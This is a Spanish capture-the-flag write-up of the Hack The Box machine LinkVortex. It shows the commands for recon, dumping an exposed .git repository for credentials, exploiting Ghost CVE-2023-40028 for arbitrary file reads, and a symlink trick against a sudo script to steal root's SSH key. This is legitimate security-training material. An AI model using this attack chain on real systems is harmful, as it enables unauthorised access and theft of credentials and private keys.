---
title: LinkVortex
description: LinkVortex es una máquina Linux de dificultad fácil, con varias formas de aprovechar los archivos de enlace simbólicos. El punto de apoyo inicial implica descubrir un directorio GIT expuesto que se puede dumpear para recuperar las credenciales. Estas credenciales permiten el acceso al sistema de gestión de contenido Ghost vulnerable a CVE-2023-40028. Esta vulnerabilidad permite a los usuarios autenticados cargar enlaces simbólicos, habilitando el archivo arbitrario leído dentro del contenedor Ghost. Las credenciales expuestas en el archivo de configuración de Ghost se pueden aprovechar para obtener un shell como usuario en el sistema de host. Finalmente, el usuario puede ejecutar un script con permisos de sudo, vulnerable a un ataque Time Of Check To Time Of Use (TOC/TOU). Esto presenta la oportunidad de aumentar los privilegios creando enlaces a archivos confidenciales en el sistema y, en última instancia, obteniendo acceso a root.
date: 2024-12-11
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-linkvortex/linkvortex_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - tcp
  - ssh
  - http
  - fuzzing_web
  - git
  - data_leaks
  - cve
  - arbitrary_file_read
  - sudo_abuse
  - symlink_abuse
  - information_gathering
  - web_analysis
  - vulnerability_exploitation
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/linkvortex:-$ ping -c 1 10.10.11.47
PING 10.10.11.47 (10.10.11.47) 56(84) bytes of data.
64 bytes from 10.10.11.47: icmp_seq=1 ttl=63 time=243 ms

--- 10.10.11.47 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 243.448/243.448/243.448/0.000 ms
```
Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/linkvortex:-$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap1 10.10.11.47
Host: 10.10.11.47 ()	Status: Up
Host: 10.10.11.47 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/linkvortex:-$ nmap -sCV -p22,80 -vvv -oN nmap2 10.10.11.47
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp open  http    syn-ack ttl 63 Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```terminal
/home/kali/Documents/htb/machines/linkvortex:-$ echo '10.10.11.47\tlinkvortex.htb' | sudo tee -a /etc/hosts
```

```terminal
/home/kali/Documents/htb/machines/linkvortex:-$ whatweb linkvortex.htb
http://linkvortex.htb [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.11.47], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], PoweredBy[Ghost,a], Script[application/ld+json], Title[BitByBit Hardware], X-Powered-By[Express], X-UA-Compatible[IE=edge]
```

---
## Web Analysis

Se identifica un servicio web con funcionalidades limitadas.

![](assets/img/htb-writeup-linkvortex/linkvortex1_1.png)

Tras revisar archivos comunes, detecto la existencia de un `robots.txt`. En su contenido se listan varios directorios, entre ellos `/ghost/`.

![](assets/img/htb-writeup-linkvortex/linkvortex1_2.png)

El directorio `/ghost/` redirige a un formulario de inicio de sesión. Al no disponer de credenciales válidas, se continúo con el análisis.

![](assets/img/htb-writeup-linkvortex/linkvortex1_3.png)

---

Enumero subdominios con gobuster.

```terminal
/home/kali/Documents/htb/machines/linkvortex:-$ gobuster dns -d linkvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -i –wildcard
Found: dev.linkvortex.htb
```

Actualizo el archivo `/etc/hosts` para poder acceder al nuevo subdominio.

```terminal
/home/kali/Documents/htb/machines/linkvortex:-$ sudo sed -i '$d' /etc/hosts
/home/kali/Documents/htb/machines/linkvortex:-$ echo '10.10.11.47\tlinkvortex.htb\tdev.linkvortex.htb' | sudo tee -a /etc/hosts
```

En principio, el subdominio muestra una página sin contenido relevante.

![](assets/img/htb-writeup-linkvortex/linkvortex2_1.png)

Sin embargo, al hacer fuzzing, encuentro un repositorio `.git` expuesto.

```terminal
/home/kali/Documents/htb/machines/linkvortex:-$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://dev.linkvortex.htb/ 
/.git                 (Status: 301) [Size: 239] [--> http://dev.linkvortex.htb/.git/]
/.git/HEAD            (Status: 200) [Size: 41]
/.git/config          (Status: 200) [Size: 201]
/.git/logs/           (Status: 200) [Size: 868]
/.git/index           (Status: 200) [Size: 707577]
```

![](assets/img/htb-writeup-linkvortex/linkvortex2_2.png)

Utilizo [Git Dumper](https://github.com/arthaud/git-dumper) para descargar el repositorio completo.

```terminal
(venv)-/home/kali/Documents/htb/machines/linkvortex:-$ python3 /home/kali/Documents/tools/git-dumper/git_dumper.py http://dev.linkvortex.htb/.git/ ./git
```

Busco información sensible filtrando por la palabra `password` y encuentro posibles credenciales.

```terminal
/home/kali/Documents/htb/machines/linkvortex/git:-$ grep -rE 'password ='
```

![](assets/img/htb-writeup-linkvortex/linkvortex2_3.png)

```terminal
/home/kali/Documents/htb/machines/linkvortex/git:-$ cat ghost/core/test/regression/api/admin/authentication.test.js | grep -B 3 'OctopiFociPilfer45'
        it('complete setup', async function () {
            const email = 'test@example.com';
            const password = 'OctopiFociPilfer45';
```

Intento iniciar sesión en el formulario con el usuario `admin@linkvortex.htb` y la contraseña encontrada `OctopiFociPilfer45`, y tengo éxito.

![](assets/img/htb-writeup-linkvortex/linkvortex2_4.png)

---
## Vulnerability Exploitation

![](assets/img/htb-writeup-linkvortex/linkvortex3_1.png)

Una vez autenticado como usuario válido, y recordando que whatweb detectó la versión `[Ghost 5.58]`, identifico la vulnerabilidad [CVE-2023-40028](https://nvd.nist.gov/vuln/detail/CVE-2023-40028), la cual puede ser explotada en este entorno. Las versiones anteriores a la `5.59.1` son vulnerables a una condición que permite a usuarios autenticados subir archivos simbólicos, lo que puede ser aprovechado para realizar lecturas arbitrarias de archivos en el sistema operativo.

Utilizo el exploit [0xyassine-CVE-2023-40028](https://github.com/0xyassine/CVE-2023-40028/), el cual permite la lectura de archivos arbitrarios desde el sistema.

```terminal
/home/kali/Documents/htb/machines/linkvortex:-$ wget https://raw.githubusercontent.com/0xyassine/CVE-2023-40028/refs/heads/master/CVE-2023-40028.sh

/home/kali/Documents/htb/machines/linkvortex:-$ ./exploit.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
file> /etc/passwd
```

![](assets/img/htb-writeup-linkvortex/linkvortex3_2.png)

Analizando el archivo `Dockerfile.ghost` del repositorio `.git`, observo que el archivo de configuración `config.production.json` es copiado a `/var/lib/ghost/config.production.json`.

```terminal
/home/kali/Documents/htb/machines/linkvortex/git:-$ cat Dockerfile.ghost
```

![](assets/img/htb-writeup-linkvortex/linkvortex3_3.png)

Al leer este archivo de configuración desde el sistema, encuentro credenciales de acceso ssh para el usuario `bob`.

```terminal
file> /var/lib/ghost/config.production.json
```

![](assets/img/htb-writeup-linkvortex/linkvortex3_4.png)

```terminal
/home/kali/Documents/htb/machines/linkvortex:-$ ssh bob@linkvortex.htb
bob@linkvortex.htb's password: fibber-talented-worth

bob@linkvortex:~$ cat user.txt
```

---
## Privilege Escalation

Tras iniciar sesión como `bob`, compruebo los usuarios y mi capacidad de ejecutar comandos con privilegios elevados.

```terminal
bob@linkvortex:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
bob:x:1001:1001::/home/bob:/bin/bash
```

Descubro que puedo correr sin contraseña el script `clean_symlink.sh` sobre cualquier archivo `.png`.

```terminal
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```
```terminal
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
```

![](assets/img/htb-writeup-linkvortex/linkvortex4_1.png)

Este script está diseñado para procesar únicamente enlaces `.png`, Si es un symlink, revisa a qué apunta, si apunta a algo con `etc` o `root`, lo borra por seguridad, si no, lo mueve a `/var/quarantined`. Si la variable `CHECK_CONTENT` es igual a `true` expone el contenido de cualquier archivo apuntado una vez pasado el filtro de seguridad.

El script sólo comprueba una vez el destino del symlink en busca de menciones a `etc` o `root`. Si el nombre intermedio no contiene esas cadenas, pasa el filtro.

* Creo un primer symlink `rsa.txt` que apunta a `/root/.ssh/id_rsa`.
* Luego creo un segundo symlink `rsa.png` que apunta a `./rsa.txt`.
* Habilito la variable `CHECK_CONTENT` y llamo al script como `root`.

```terminal
bob@linkvortex:~$ ln -s /root/.ssh/id_rsa rsa.txt
bob@linkvortex:~$ ln -s /home/bob/rsa.txt rsa.png
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/rsa.png
```

Con la clave privada, la copio a mi máquina y me conecto por ssh como `root`.

```terminal
/home/kali/Documents/htb/machines/linkvortex:-$ ssh -i id_rsa root@linkvortex.htb

root@linkvortex:~# cat /root/root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/638" target="_blank">Linkvortex Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }
